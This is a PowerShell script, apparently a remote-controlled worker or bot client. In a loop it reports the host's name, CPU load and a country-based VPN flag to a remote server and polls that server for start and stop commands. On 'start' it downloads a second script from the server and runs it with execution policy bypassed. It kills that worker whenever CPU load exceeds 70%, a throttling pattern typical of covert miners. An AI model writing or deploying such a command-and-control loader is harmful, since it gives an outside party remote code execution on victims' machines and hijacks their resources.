$SERVER = "https://mcontrol.vercel.app/"
$SYSTEM = $env:COMPUTERNAME

$TEMP_DIR = "$env:TEMP\worker_env"
$WORKER = $null
$CPU_LIMIT = 70

function Get-CPU {
    (Get-Counter '\Processor(_Total)\% Processor Time').CounterSamples.CookedValue
}

function Check-VPN {

    try {

        $info = Invoke-RestMethod `
            -Uri "https://ipapi.co/json/" `
            -TimeoutSec 10

        $country = $info.country

        Write-Host "Public IP Country: $country"

        if ($country -ne "IN") {
            return $true
        }
        else {
            return $false
        }
    }
    catch {
        Write-Host "VPN check failed"
        return $false
    }
}
function Send-Status($running,$cpu,$vpnStatus){
  
    $data = @{
        id = $SYSTEM
        running = $running
        cpu = [int]$cpu
        vpn = $vpnStatus
    } | ConvertTo-Json

Invoke-RestMethod `
 -Uri "https://mcontrol.vercel.app/api/status" `
 -Method POST `
 -ContentType "application/json" `
 -Body $data

}

function Get-Command {
    try {
        (Invoke-RestMethod "$SERVER/api/command?id=$SYSTEM").command
    } catch {
        "stop"
    }
}

function Start-Worker {

    if ($WORKER) { return }

    if (!(Test-Path $TEMP_DIR)) {
        New-Item -ItemType Directory $TEMP_DIR | Out-Null
    }

    Invoke-WebRequest `
        -Uri "https://mcontrol.vercel.app/worker.ps1" `
        -OutFile "$TEMP_DIR\worker.ps1"

    $global:WORKER = Start-Process powershell `
        -ArgumentList "-ExecutionPolicy Bypass -File `"$TEMP_DIR\worker.ps1`"" `
        -PassThru
}

function Stop-Worker {

    if ($WORKER) {
        Stop-Process -Id $WORKER.Id -Force
        $global:WORKER = $null
    }

    if (Test-Path $TEMP_DIR) {
        Remove-Item $TEMP_DIR -Recurse -Force
    }
}

while($true){

    $cpu = Get-CPU
    $cmd = Get-Command

    if($cpu -gt $CPU_LIMIT){
        Stop-Worker
    }

    if($cmd -eq "start"){ Start-Worker }
    if($cmd -eq "stop"){ Stop-Worker }

    $running = $WORKER -ne $null

    $vpnStatus = Check-VPN
    Send-Status $running $cpu $vpnStatus

    Start-Sleep 30
}
